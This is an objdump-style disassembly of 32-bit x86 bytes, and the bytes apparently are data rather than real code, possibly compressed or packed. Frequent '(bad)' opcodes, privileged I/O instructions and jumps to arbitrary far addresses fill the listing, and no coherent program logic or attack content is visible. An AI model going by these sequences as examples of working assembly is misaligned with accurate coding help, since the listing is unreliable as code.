  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	adc    BYTE PTR [edi+0x52],bl
  41fac3:	adc    DWORD PTR [ebx-0xafffead],ebx
  41fac9:	add    BYTE PTR [eax],al
  41facb:	add    BYTE PTR [ebx-0x65085d50],dh
  41fad1:	and    eax,0x39f2c2fd
  41fad6:	fs das 
  41fad8:	or     cl,BYTE PTR [ecx+0x3d77bec6]
  41fade:	sbb    DWORD PTR [ecx],ebx
  41fae0:	mov    ah,0xb0
  41fae2:	jns    0x41fa7f
  41fae4:	pushf  
  41fae5:	cmp    BYTE PTR [ebx+0x21],dh
  41fae8:	mov    dl,BYTE PTR [ecx-0x80]
  41faeb:	int3   
  41faec:	fxch   st(7)
  41faee:	sub    ch,ch
  41faf0:	jg     0x41fa73
  41faf2:	pop    ds
  41faf3:	aam    0xff
  41faf5:	jbe    0x41fb43
  41faf7:	push   ds
  41faf8:	ror    DWORD PTR [ebx],0x7
  41fafb:	xor    ah,BYTE PTR ds:0x8b44b844
  41fb01:	loopne 0x41fac9
  41fb03:	mov    ch,BYTE PTR [ebp+0x21]
  41fb06:	cmc    
  41fb07:	or     eax,0x14863b33
  41fb0c:	jae    0x41facd
  41fb0e:	jmp    0xe3a585af
  41fb13:	call   0x4496:0x99ac2f75
  41fb1a:	jne    0x41fb11
  41fb1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb1d:	nop
  41fb1e:	add    ebx,DWORD PTR [eax-0xfb59d4b]
  41fb24:	sub    BYTE PTR [ebp+eiz*2+0x2],0x1c
  41fb29:	gs pusha 
  41fb2b:	and    DWORD PTR [edi],edi
  41fb2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb2e:	leave  
  41fb2f:	je     0x41fae2
  41fb31:	jnp    0x41fb1f
  41fb33:	(bad)  
  41fb34:	data16 adc BYTE PTR ds:0x96dffb23,bh
  41fb3b:	mov    edi,0x35cfca11
  41fb40:	out    dx,al
  41fb41:	ret    0x30c8
  41fb44:	outs   dx,DWORD PTR ds:[esi]
  41fb45:	push   edi
  41fb46:	and    eax,0xb6811fd
  41fb4b:	xchg   esi,eax
  41fb4c:	stc    
  41fb4d:	shl    DWORD PTR [esi-0x79],1
  41fb50:	jle    0x41fb59
  41fb52:	out    0x4c,eax
  41fb54:	es adc eax,0x5cb442bc
  41fb5a:	or     eax,DWORD PTR [edx+0xe]
  41fb5d:	cmc    
  41fb5e:	sub    BYTE PTR [ebp-0x30],al
  41fb61:	fnstsw WORD PTR [ebx+0x2f9869ae]
  41fb67:	mov    al,0x1f
  41fb69:	sbb    al,0x85
  41fb6b:	jmp    0x41fba4
  41fb6d:	mov    ebp,0xc07b0b8f
  41fb72:	jecxz  0x41fb3e
  41fb74:	inc    DWORD PTR [edx-0x72]
  41fb77:	mov    al,ds:0xa09dcf96
  41fb7c:	and    edx,DWORD PTR es:[esi+0x76fa4553]
  41fb83:	ja     0x41fbe1
  41fb85:	and    al,0x4f
  41fb87:	rcr    DWORD PTR [esi-0x7d8e52b5],cl
  41fb8d:	adc    cl,BYTE PTR [ebx+0x44]
  41fb90:	sub    DWORD PTR [eax+ebx*8+0x52dee6da],eax
  41fb97:	cmp    al,0x89
  41fb99:	sub    ah,BYTE PTR [ecx-0x2d]
  41fb9c:	xchg   ebp,eax
  41fb9d:	cmp    ecx,DWORD PTR [edx+ebx*8-0x2cdd717]
  41fba4:	mov    dl,0xe5
  41fba6:	cmp    esi,ecx
  41fba8:	pop    eax
  41fba9:	adc    esi,DWORD PTR [ebx]
  41fbab:	fwait
  41fbac:	xor    ebp,DWORD PTR [ebx+edi*4]
  41fbaf:	out    0x35,eax
  41fbb1:	(bad)  
  41fbb2:	or     al,BYTE PTR [edi-0x39]
  41fbb5:	adc    al,0xa1
  41fbb7:	outs   dx,DWORD PTR ds:[esi]
  41fbb8:	mov    ebx,0x7b614f7e
  41fbbd:	jb     0x41fbc2
  41fbbf:	in     eax,0x23
	...
  41fc31:	add    BYTE PTR [eax],al
  41fc33:	add    BYTE PTR [ecx-0xf],al
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0xbf328ad2
  41fc42:	dec    eax
  41fc43:	fist   WORD PTR [eax-0xafffeac]
  41fc49:	add    BYTE PTR [eax],al
  41fc4b:	add    BYTE PTR [ebp+0x4f],dl
  41fc4e:	xor    DWORD PTR [ecx-0x4de99890],ebp
  41fc54:	inc    esi
  41fc55:	jmp    0xd26b:0xfec47cfd
  41fc5c:	xchg   edx,eax
  41fc5d:	dec    esp
  41fc5e:	retf   
  41fc5f:	pushf  
  41fc60:	sub    bh,BYTE PTR [eax+0x36]
  41fc63:	add    BYTE PTR [ecx+eiz*8+0x47],ch
  41fc67:	es push es
  41fc69:	push   0x8
  41fc6b:	xchg   DWORD PTR [edi-0x43],esi
  41fc6e:	or     DWORD PTR [ebp+0x48],ebp
  41fc71:	fldl2t 
  41fc73:	mov    ebp,0xe635d362
  41fc78:	ret    0xcb4a
  41fc7b:	rol    DWORD PTR [eax+0x7b80cfb9],cl
  41fc81:	scas   al,BYTE PTR es:[edi]
  41fc82:	std    
  41fc83:	retf   0xc0e6
  41fc86:	into   
  41fc87:	pop    esi
  41fc88:	int3   
  41fc89:	cmp    DWORD PTR [esi+ebx*4-0x61f9732],0x0
  41fc91:	adc    esi,esp
  41fc93:	stos   DWORD PTR es:[edi],eax
  41fc94:	xchg   BYTE PTR [ebx+0x1ef2988c],ah
  41fc9a:	push   ebp
  41fc9b:	jne    0x41fc4b
  41fc9d:	jmp    0x41fc40
  41fc9f:	cmp    ebx,DWORD PTR [eax-0x3c]
  41fca2:	adc    ebx,DWORD PTR [edi+eiz*8+0x6c]
  41fca6:	adc    al,ah
  41fca8:	stos   DWORD PTR es:[edi],eax
  41fca9:	iret   
  41fcaa:	dec    eax
  41fcab:	or     BYTE PTR [ebx+ecx*4+0x65],ch
  41fcaf:	jne    0x41fc88
  41fcb1:	or     DWORD PTR [esi+0x46bddf1b],ebp
  41fcb7:	dec    ebp
  41fcb8:	rcr    bl,cl
  41fcba:	inc    ebx
  41fcbb:	pop    ebp
  41fcbc:	out    0x64,al
  41fcbe:	mov    ch,0xc0
  41fcc0:	jl     0x41fccd
  41fcc2:	std    
  41fcc3:	mov    dl,0xa2
  41fcc5:	out    0x43,al
  41fcc7:	and    DWORD PTR [edi],ecx
  41fcc9:	or     eax,0x4779d18a
  41fcce:	cld    
  41fccf:	jbe    0x41fd22
  41fcd1:	loop   0x41fd29
  41fcd3:	jno    0x41fcc0
  41fcd5:	push   ebp
  41fcd6:	in     eax,0x49
  41fcd8:	rcr    esi,cl
  41fcda:	mov    eax,0x7f09ddfb
  41fcdf:	test   BYTE PTR [ebp+0x7c5cda2f],al
  41fce5:	and    al,0x8f
  41fce7:	ret    0x9aea
  41fcea:	mov    ebx,0xf8a78caa
  41fcef:	push   0x2b
  41fcf1:	mov    esi,0xc95c2d5b
  41fcf6:	in     al,0x85
  41fcf8:	push   DWORD PTR [edi+0x539931bf]
  41fcfe:	cmp    DWORD PTR [eax+0x30891161],ebx
  41fd04:	scas   al,BYTE PTR es:[edi]
  41fd05:	enter  0xc15d,0xea
  41fd09:	xor    cl,BYTE PTR [ebx+0x38aa8c64]
  41fd0f:	lds    ebx,FWORD PTR [ecx+0x49e07b96]
  41fd15:	xchg   ebx,eax
  41fd16:	mov    dh,0x1e
  41fd18:	cmp    bh,BYTE PTR [ecx]
  41fd1a:	adc    BYTE PTR [ebx-0x6fbbfa6a],ah
  41fd20:	dec    esp
  41fd21:	jb     0x41fcb7
  41fd23:	rcr    esi,1
  41fd25:	dec    esi
  41fd26:	cmp    eax,0x992307b8
  41fd2b:	mov    edx,0x643cd746
  41fd30:	aaa    
  41fd31:	js     0x41fd50
  41fd33:	call   0x5728:0xfae73d03
  41fd3a:	jbe    0x41fd33
  41fd3c:	fst    QWORD PTR [ebp+0x6b]
  41fd3f:	push   edi
  41fd40:	pop    edx
	...
  41fdb1:	add    BYTE PTR [eax],al
  41fdb3:	add    BYTE PTR ds:0x7b197956,al
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	xchg   edi,eax
  41fdc1:	and    ch,dl
  41fdc3:	mov    es,WORD PTR [ebp-0xafffeab]
  41fdc9:	add    BYTE PTR [eax],al
  41fdcb:	add    ah,bl
  41fdcd:	pop    ecx
  41fdce:	mov    eax,0xf1266c15
  41fdd3:	jp     0x41fd90
  41fdd5:	jne    0x41fdc3
  41fdd7:	jnp    0x41fdac
  41fdd9:	stos   DWORD PTR es:[edi],eax
  41fdda:	imul   ebp,eax,0x1a
  41fddd:	inc    ecx
  41fdde:	div    BYTE PTR [edi]
  41fde0:	and    BYTE PTR [ecx-0x1c],dl
  41fde3:	js     0x41fdb2
  41fde5:	dec    edx
  41fde6:	push   0xff63fc5c
  41fdeb:	jecxz  0x41fdf2
  41fded:	adc    eax,0xfacb5e0e
  41fdf2:	idiv   BYTE PTR [ebx+0x7c]
  41fdf5:	and    al,0xfe
  41fdf7:	adc    BYTE PTR [ebp+0x6],cl
  41fdfa:	loope  0x41fe07
  41fdfc:	retf   0x1b8
  41fdff:	mov    BYTE PTR [edx-0x32],ah
  41fe02:	(bad)  
  41fe03:	cli    
  41fe04:	and    dh,BYTE PTR [ebp*8-0x43f48c9e]
  41fe0b:	loop   0x41fe55
  41fe0d:	sub    al,0x20
  41fe0f:	rol    bh,0x2b
  41fe12:	mov    esi,0x93052bf1
  41fe17:	mov    eax,ds:0x74b760c4
  41fe1c:	lods   eax,DWORD PTR ds:[esi]
  41fe1d:	xchg   esp,eax
  41fe1e:	mov    ebx,0xd4e2662c
  41fe23:	and    bl,cl
  41fe25:	jmp    0x3b21fdac
  41fe2a:	fsubr  DWORD PTR [ebp-0x44ddcc05]
  41fe30:	mov    al,0xe3
  41fe32:	in     al,dx
  41fe33:	mov    esi,0x5033065e
  41fe38:	xchg   BYTE PTR [edi],al
  41fe3a:	scas   al,BYTE PTR es:[edi]
  41fe3b:	les    ecx,FWORD PTR [ebx+eiz*4+0x69e22bd8]
  41fe42:	in     al,dx
  41fe43:	ins    BYTE PTR es:[edi],dx
  41fe44:	and    ah,dl
  41fe46:	push   ebx
  41fe47:	and    DWORD PTR [ebx+0x330067f3],ecx
  41fe4d:	(bad)  
  41fe4e:	jae    0x41fe3c
  41fe50:	lds    eax,FWORD PTR [ecx+0x74ac98df]
  41fe56:	adc    BYTE PTR [ebx-0x4951c70d],dh
  41fe5c:	add    BYTE PTR [edi-0x7],bh
  41fe5f:	xchg   ebx,eax
  41fe60:	aaa    
  41fe61:	mov    cl,0x7a
  41fe63:	inc    edi
  41fe64:	sub    eax,0xc1284b8a
  41fe69:	popa   
  41fe6a:	cld    
  41fe6b:	xchg   ebx,eax
  41fe6c:	mov    bl,0x40
  41fe6e:	(bad)  
  41fe6f:	arpl   WORD PTR [eax],ax
  41fe71:	cli    
  41fe72:	in     al,dx
  41fe73:	xor    al,0xcf
  41fe75:	jp     0x41fee5
  41fe77:	fwait
  41fe78:	jmp    0xf69b:0x12e21848
  41fe7f:	mov    ds:0xb811e746,eax
  41fe84:	pop    ds
  41fe85:	xchg   esi,eax
  41fe86:	les    esp,FWORD PTR [edi]
  41fe88:	es jnp 0x41fed6
  41fe8b:	nop
  41fe8c:	push   cs
  41fe8d:	(bad)  
  41fe8e:	lock sbb dh,BYTE PTR [edx+0x48]
  41fe92:	jle    0x41fef9
  41fe94:	jbe    0x41fe54
  41fe96:	lods   eax,DWORD PTR ds:[esi]
  41fe97:	daa    
  41fe98:	pop    ss
  41fe99:	in     al,dx
  41fe9a:	add    DWORD PTR [eax],esi
  41fe9c:	loopne 0x41fe53
  41fe9e:	rcr    DWORD PTR [ebx+0x25],1
  41fea1:	cmp    bl,cl
  41fea3:	pop    ecx
  41fea4:	inc    eax
  41fea5:	cmp    DWORD PTR [ecx+0x77a606fe],edi
  41feab:	inc    ebp
  41feac:	outs   dx,BYTE PTR ds:[esi]
  41fead:	cli    
  41feae:	aam    0xb
  41feb0:	cs dec edx
  41feb2:	xchg   ecx,eax
  41feb3:	sbb    BYTE PTR [eax-0x52],bh
  41feb6:	jbe    0x41feb0
  41feb8:	adc    edi,DWORD PTR [ecx+0x29]
  41febb:	xor    edx,DWORD PTR [ebx-0x23]
  41febe:	enter  0x18bd,0x0
	...
  41ff32:	add    BYTE PTR [eax],al
  41ff34:	mov    ecx,0xff25bf5d
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi+0x39d72a87],?
  41ff44:	jp     0x41ff9c
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	cmc    
  41ff49:	add    BYTE PTR [eax],al
  41ff4b:	add    BYTE PTR [ecx+0x22],al
  41ff4e:	inc    ecx
  41ff4f:	popa   
  41ff50:	ror    BYTE PTR [edx+eiz*1],1
  41ff53:	in     al,0x1c
  41ff55:	dec    edi
  41ff56:	mov    ds:0x341811aa,eax
  41ff5b:	fdiv   QWORD PTR [edx+0x1a]
  41ff5e:	dec    esp
  41ff5f:	jmp    0x41ff67
  41ff61:	sub    DWORD PTR [ebp-0x23],ecx
  41ff64:	ret    0xd9bc
  41ff67:	mov    cl,0xce
  41ff69:	or     esi,DWORD PTR [ecx+0x3]
  41ff6c:	xor    eax,0x51e75da5
  41ff71:	cvtps2pi mm5,QWORD PTR [ebp+0x9]
  41ff75:	push   cs
  41ff76:	inc    ecx
  41ff77:	jmp    0x4621:0xf7a06eea
  41ff7e:	retf   0x4c21
  41ff81:	into   
  41ff82:	jecxz  0x41ffbe
  41ff84:	cmp    BYTE PTR [eiz*2+0x503fd493],cl
  41ff8b:	int3   
  41ff8c:	xlat   BYTE PTR ds:[ebx]
  41ff8d:	in     al,0xa7
  41ff8f:	aad    0xd2
  41ff91:	add    BYTE PTR [edi+edi*4+0x79],dh
  41ff95:	sbb    eax,0x8156eeee
  41ff9a:	push   edi
  41ff9b:	ror    BYTE PTR [eax+0x50],cl
  41ff9e:	ja     0x41ffbb
  41ffa0:	mov    ecx,edx
  41ffa2:	cli    
  41ffa3:	push   ebp
  41ffa4:	clc    
  41ffa5:	sub    ecx,eax
  41ffa7:	arpl   WORD PTR [edi],si
  41ffa9:	retf   0xde36
  41ffac:	iret   
  41ffad:	xchg   edx,edx
  41ffaf:	xchg   esp,eax
  41ffb0:	push   ds
  41ffb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffb2:	pop    esi
  41ffb3:	ja     0x41ffe1
  41ffb5:	pop    ebx
  41ffb6:	hlt    
  41ffb7:	xchg   edx,eax
  41ffb8:	loopne 0x41ffc2
  41ffba:	sbb    bh,dh
  41ffbc:	xchg   esp,eax
  41ffbd:	add    ch,0xd2
  41ffc0:	push   ecx
  41ffc1:	pop    ecx
  41ffc2:	(bad)  
  41ffc3:	xchg   esp,eax
  41ffc4:	or     dl,BYTE PTR [ebx]
  41ffc6:	push   ebx
  41ffc7:	test   eax,0x87f40ad5
  41ffcc:	mov    edx,0x830394e5
  41ffd1:	or     al,bh
  41ffd3:	mov    eax,0x50bb65a4
  41ffd8:	sbb    al,0x6b
  41ffda:	arpl   WORD PTR [eax],ax
  41ffdc:	mov    bl,0x7d
  41ffde:	cmp    ecx,DWORD PTR [edx]
  41ffe0:	adc    edi,DWORD PTR [edx-0x58]
  41ffe3:	push   ds
  41ffe4:	xchg   esi,eax
  41ffe5:	in     eax,dx
  41ffe6:	int    0x8c
  41ffe8:	ds add bh,bl
  41ffeb:	out    0x58,al
  41ffed:	sti    
  41ffee:	out    0xf,eax
  41fff0:	cld    
  41fff1:	mov    DWORD PTR [eax+edi*4],ebp
  41fff4:	aam    0xa0
  41fff6:	jno    0x41ffdc
  41fff8:	fucomi st,st(6)
  41fffa:	icebp  
  41fffb:	iret   
  41fffc:	xor    dl,ch
  41fffe:	(bad)  
  41ffff:	lds    eax,FWORD PTR [edx]
  420001:	imul   ecx,edx,0xffffff92
  420004:	jecxz  0x41ff94
  420006:	jo     0x41ffd8
  420008:	in     al,0xc
  42000a:	mov    ah,0xfe
  42000c:	leave  
  42000d:	pop    ecx
  42000e:	imul   esi,DWORD PTR [ebp-0xd7c6039],0x3832ec2
  420018:	aad    0xa0
  42001a:	test   DWORD PTR [edi-0x797a71ee],edi
  420020:	retf   0x94b3
  420023:	mov    ch,0x1d
  420025:	pushf  
  420026:	mov    ebp,0xd9f9b838
  42002b:	or     eax,0xc6b6184f
  420030:	xchg   BYTE PTR [ecx+eiz*4],bl
  420033:	xor    edx,DWORD PTR [eax+0x3dfc07f8]
  420039:	lock pusha 
  42003b:	loope  0x42002b
  42003d:	mov    al,ds:0x937d06
	...
  4200b2:	add    BYTE PTR [eax],al
  4200b4:	fild   QWORD PTR [edx+ebp*1+0x6c]
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax-0x134700de],ax
  4200c4:	outs   dx,DWORD PTR ds:[esi]
  4200c5:	push   edi
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	cmc    
  4200c9:	add    BYTE PTR [eax],al
  4200cb:	add    BYTE PTR [esi-0x905b6cb],ch
  4200d1:	shr    DWORD PTR [edx],cl
  4200d3:	lahf   
  4200d4:	or     esi,DWORD PTR [edi+0x3b]
  4200d7:	pusha  
  4200d8:	inc    edi
  4200d9:	pop    edi
  4200da:	sub    ch,0x40
  4200dd:	jp     0x420150
  4200df:	mov    al,0x40
  4200e1:	xor    edi,DWORD PTR [eax+0x16]
  4200e4:	ins    DWORD PTR es:[edi],dx
  4200e5:	cmp    al,BYTE PTR [ebx+0x4b]
  4200e8:	and    al,0x86
  4200ea:	lods   eax,DWORD PTR ds:[esi]
  4200eb:	adc    al,0x5e
  4200ed:	lods   eax,DWORD PTR ds:[esi]
  4200ee:	in     al,dx
  4200ef:	stc    
  4200f0:	dec    esp
  4200f1:	ror    BYTE PTR [ecx],cl
  4200f3:	bound  edi,QWORD PTR [eax-0x66]
  4200f6:	adc    ah,ah
  4200f8:	push   ebx
  4200f9:	and    dl,BYTE PTR [edx-0x57]
  4200fc:	cwde   
  4200fd:	push   cs
  4200fe:	(bad)  
  420100:	jmp    0x4709:0x8e23a465
  420107:	dec    esi
  420108:	cld    
  420109:	(bad)  
  42010a:	cmp    DWORD PTR [eax+eiz*8],ebp
  42010d:	push   ebp
  42010e:	stos   DWORD PTR es:[edi],eax
  42010f:	fstp   TBYTE PTR [ecx]
  420111:	adc    DWORD PTR [edi],esi
  420113:	(bad)  
  420114:	aaa    
  420115:	fs pop ebp
  420117:	jmp    0xdf3956ea
  42011c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42011d:	cmc    
  42011e:	loop   0x420192
  420120:	xlat   BYTE PTR ds:[ebx]
  420121:	jmp    0x822faaab
  420126:	mov    cs,WORD PTR [eax+eiz*2-0x5651cc0c]
  42012d:	sti    
  42012e:	shr    DWORD PTR ds:0xe0506306,0xd8
  420135:	nop
  420136:	xor    ah,BYTE PTR [edi+eiz*2]
  420139:	loope  0x4200cb
  42013b:	xor    DWORD PTR es:[eax+0x79],esi
  42013f:	cmp    al,0x81
  420141:	mov    edi,0xe81dd2bd
  420146:	add    ebx,DWORD PTR [ebx+esi*4]
  420149:	mov    ebp,0x4c5cebca
  42014e:	pop    eax
  42014f:	xchg   BYTE PTR [ecx],al
  420151:	sub    BYTE PTR [eax-0x11],dl
  420154:	addr16 dec ebp
  420156:	push   cs
  420157:	or     BYTE PTR [edx],ch
  420159:	das    
  42015a:	icebp  
  42015b:	sub    edx,edi
  42015d:	sbb    BYTE PTR es:[ecx-0x4b902339],bl
  420164:	cwde   
  420165:	stc    
  420166:	xlat   BYTE PTR ds:[ebx]
  420167:	repz cmp dl,BYTE PTR [ebx+0x16b304ac]
  42016e:	in     eax,0xc6
  420170:	cmp    BYTE PTR [esi-0x225469a4],bh
  420176:	cmp    al,0xae
  420178:	push   ds
  420179:	ins    DWORD PTR es:[edi],dx
  42017a:	out    0x93,eax
  42017c:	sbb    bh,BYTE PTR [edx+esi*8]
  42017f:	push   ecx
  420180:	inc    eax
  420181:	mov    ecx,DWORD PTR [eax]
  420183:	sub    DWORD PTR [eax],edx
  420185:	mov    eax,DWORD PTR [ebx]
  420187:	lock xchg ebp,eax
  420189:	stc    
  42018a:	ins    BYTE PTR es:[edi],dx
  42018b:	xor    DWORD PTR [edi],esp
  42018d:	add    eax,0x85d76ad4
  420192:	stos   DWORD PTR es:[edi],eax
  420193:	sti    
  420194:	jmp    0x420215
  420196:	adc    eax,0x76a723f6
  42019b:	push   esi
  42019c:	mov    WORD PTR [ebx+0x3b],fs
  42019f:	xchg   ebp,eax
  4201a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201a1:	lea    esp,[ebx+edx*1]
  4201a4:	popa   
  4201a5:	mov    al,0x47
  4201a7:	stc    
  4201a8:	nop
  4201a9:	cmp    al,0x12
  4201ab:	je     0x42021f
  4201ad:	pop    eax
  4201ae:	push   ebx
  4201af:	and    edi,DWORD PTR [ecx-0x4b8329ed]
  4201b5:	addr16 push esi
  4201b7:	ret    0xcd06
  4201ba:	nop
  4201bb:	mov    ds:0x9fc59aba,eax
	...
  420231:	add    BYTE PTR [eax],al
  420233:	add    BYTE PTR [ecx+0x1b],dl
  420236:	jmp    DWORD PTR [esi-0x1]
  420239:	out    0xd9,al
  42023b:	aas    
  42023c:	mov    DWORD PTR ds:0x394fd010,ebx
  420242:	(bad)  
  420243:	xor    ah,BYTE PTR [eax+ebx*2+0x1]
  420247:	add    ch,dh
  420249:	add    BYTE PTR [eax],al
  42024b:	add    BYTE PTR [edx+0x40],ch
  42024e:	cdq    
  42024f:	js     0x4201f6
  420251:	inc    esp
  420252:	jl     0x4201ee
  420254:	push   es
  420255:	adc    esp,DWORD PTR cs:[esi]
  420258:	inc    ebp
  420259:	out    dx,al
  42025a:	push   0xfffffff0
  42025c:	dec    eax
  42025d:	into   
  42025e:	push   edx
  42025f:	and    DWORD PTR [eax],esp
  420261:	rcl    BYTE PTR [edx],cl
  420263:	daa    
  420264:	test   DWORD PTR [esi+0x70],esi
  420267:	push   es
  420268:	xor    DWORD PTR [ebp+0x2d],0xffffffed
  42026c:	ret    0xfddd
  42026f:	pop    ds
  420270:	aad    0xff
  420272:	add    BYTE PTR [ecx+0x24],0xdd
  420276:	test   edi,0x2feaa29f
  42027c:	cwde   
  42027d:	test   eax,0xcdc8b722
  420282:	adc    BYTE PTR [edi],bl
  420284:	clc    
  420285:	in     al,dx
  420286:	and    edx,DWORD PTR ds:[ecx]
  420289:	rcl    DWORD PTR [edi],cl
  42028b:	mov    edx,0xdb57d767
  420290:	ret    0xbdcc
  420293:	push   esi
  420294:	(bad)  
  420295:	xor    al,BYTE PTR [edi-0x6a]
  420298:	in     eax,0x9e
  42029a:	dec    esi
  42029b:	ja     0x420312
  42029d:	imul   ecx,DWORD PTR [esp+ebx*2-0x480cbca2],0x19
  4202a5:	fldcw  WORD PTR [ebp-0x43]
  4202a8:	aam    0x7f
  4202aa:	retf   
  4202ab:	xor    al,0x29
  4202ad:	das    
  4202ae:	push   ds
  4202af:	sub    al,BYTE PTR [ecx]
  4202b1:	inc    edi
  4202b2:	and    esi,DWORD PTR [esi]
  4202b4:	mov    eax,0x52edafb4
  4202b9:	test   eax,0x8fd87102
  4202be:	es jmp 0x9309b3fe
  4202c4:	cld    
  4202c5:	mov    gs,WORD PTR [edi]
  4202c7:	test   al,0x56
  4202c9:	int    0x83
  4202cb:	test   BYTE PTR [edi-0x168ae23d],al
  4202d1:	sub    DWORD PTR ds:0x4f970d2f,esp
  4202d7:	mov    eax,0xe0c0f4e5
  4202dc:	push   edx
  4202dd:	(bad)  
  4202de:	cmp    eax,DWORD PTR [edi-0x6ebfe9a9]
  4202e4:	in     eax,0xf0
  4202e6:	lahf   
  4202e7:	xchg   ecx,eax
  4202e8:	psubsb mm1,mm6
  4202eb:	bound  ebx,QWORD PTR [edx-0x4e]
  4202ee:	ins    BYTE PTR es:[edi],dx
  4202ef:	(bad)  
  4202f0:	mov    ebx,0xf633f49b
  4202f5:	fwait
  4202f6:	enter  0x6d69,0x29
  4202fa:	lock push eax
  4202fc:	scas   al,BYTE PTR es:[edi]
  4202fd:	adc    DWORD PTR [esi],esi
  4202ff:	cmp    DWORD PTR [edx-0x57],edx
  420302:	xchg   esp,eax
  420303:	dec    esp
  420304:	jecxz  0x4202fb
  420306:	clc    
  420307:	test   bl,bl
  420309:	popf   
  42030a:	pop    edi
  42030b:	(bad)  
  42030d:	cs hlt 
  42030f:	into   
  420310:	xlat   BYTE PTR ds:[ebx]
  420311:	cmp    DWORD PTR [edi-0x66df9c73],esp
  420317:	ja     0x4202c5
  420319:	retf   
  42031a:	inc    esi
  42031b:	icebp  
  42031c:	loope  0x420378
  42031e:	jns    0x42036d
  420320:	jno    0x4202a4
  420322:	xchg   ebp,eax
  420323:	pop    es
  420324:	add    eax,0x3865c6fd
  420329:	(bad)  
  42032a:	adc    eax,0xd919b042
  42032f:	mov    al,0xb
  420331:	lods   eax,DWORD PTR ds:[esi]
  420332:	aaa    
  420333:	sti    
  420334:	mov    bl,0x96
  420336:	push   ebx
  420337:	mov    db0,edx
  42033a:	in     eax,dx
  42033b:	lods   al,BYTE PTR ds:[esi]
  42033c:	xchg   ecx,eax
  42033d:	inc    ebx
  42033e:	sbb    eax,0x69f1
	...
  4203b3:	add    BYTE PTR [edi+eiz*8],bh
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [eax-0xa],bx
  4203c2:	mov    al,ds:0x1595948
  4203c7:	add    ch,dh
  4203c9:	add    BYTE PTR [eax],al
  4203cb:	add    BYTE PTR [edi+0x1e],dl
  4203ce:	fild   WORD PTR [ecx+0x4b]
  4203d1:	sbb    BYTE PTR [esp+ebp*1-0x4a],dh
  4203d5:	ficom  DWORD PTR [edi]
  4203d7:	push   es
  4203d8:	mov    ds,WORD PTR [ebx]
  4203da:	mov    ecx,0x3be31cb1
  4203df:	cmp    BYTE PTR [ebx],al
  4203e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203e2:	xchg   ebx,eax
  4203e3:	add    eax,0x238129b2
  4203e8:	out    0x99,al
  4203ea:	aaa    
  4203eb:	dec    ecx
  4203ec:	bound  eax,QWORD PTR [esi]
  4203ee:	iret   
  4203ef:	shr    ecx,0xd1
  4203f2:	imul   BYTE PTR [edi+0x60]
  4203f5:	lods   eax,DWORD PTR ds:[esi]
  4203f6:	jmp    0xe7bca31d
  4203fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203fc:	dec    ebx
  4203fd:	jp     0x4203e3
  4203ff:	dec    edi
  420400:	ds addr16 jp 0x420398
  420404:	xchg   esp,eax
  420405:	mov    al,0x11
  420407:	jg     0x4203b0
  420409:	inc    esi
  42040a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42040b:	pop    ss
  42040c:	loop   0x420477
  42040e:	cdq    
  42040f:	(bad)  
  420410:	jmp    0x4203c4
  420412:	imul   eax,DWORD PTR [ebx],0xffffffea
  420415:	fdiv   DWORD PTR [edi-0x38]
  420418:	loopne 0x420431
  42041a:	push   esp
  42041b:	mov    ?,WORD PTR [edx+ebx*4-0x3cfed9b2]
  420422:	add    ecx,DWORD PTR [ecx-0x18]
  420425:	pushw  0x816f
  420429:	xchg   esp,eax
  42042a:	cdq    
  42042b:	dec    edi
  42042c:	push   DWORD PTR [edx+0x6c]
  42042f:	or     al,0x51
  420431:	dec    edx
  420432:	gs cdq 
  420434:	jmp    0x4204a1
  420436:	fdiv   DWORD PTR ds:0xcc52f63e
  42043c:	push   0x7b
  42043e:	sbb    DWORD PTR [ebp+0x39829658],edx
  420444:	pop    ebp
  420445:	hlt    
  420446:	nop
  420447:	rol    edi,cl
  420449:	pextrw ebp,(bad),0xc5
  42044b:	lods   eax,DWORD PTR ds:[esi]
  42044c:	mov    BYTE PTR [ecx],dh
  42044e:	lahf   
  42044f:	xchg   edi,eax
  420450:	push   edi
  420451:	adc    BYTE PTR [eax+eax*2-0x72],dl
  420455:	jg     0x4204bc
  420457:	pop    ecx
  420458:	add    eax,0x60b2ee01
  42045d:	dec    edx
  42045e:	repnz enter 0x8b47,0x91
  420463:	xchg   ebp,eax
  420464:	aas    
  420465:	pushf  
  420466:	in     al,0x5d
  420468:	dec    ecx
  420469:	ins    BYTE PTR es:[edi],dx
  42046a:	es push ds
  42046c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42046e:	rcr    DWORD PTR [eax-0x2429be92],1
  420474:	jmp    0x6c16:0x34105032
  42047b:	mov    ds:0x1e96d759,eax
  420480:	stc    
  420481:	rcr    BYTE PTR [ebx-0x31],cl
  420484:	and    DWORD PTR [esi-0x6cbfbdd2],0x61260af
  42048e:	test   DWORD PTR [ecx-0xd],ebx
  420491:	mov    ebx,0x71c3eee
  420496:	xor    DWORD PTR [ecx],0x76c2d068
  42049c:	cmovo  eax,DWORD PTR [esi+0x1b]
  4204a0:	adc    BYTE PTR [eax],cl
  4204a2:	nop
  4204a3:	es enter 0xc440,0x41
  4204a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204a9:	das    
  4204aa:	ret    
  4204ab:	pusha  
  4204ac:	pop    es
  4204ad:	loope  0x420475
  4204af:	sub    ebp,edi
  4204b1:	into   
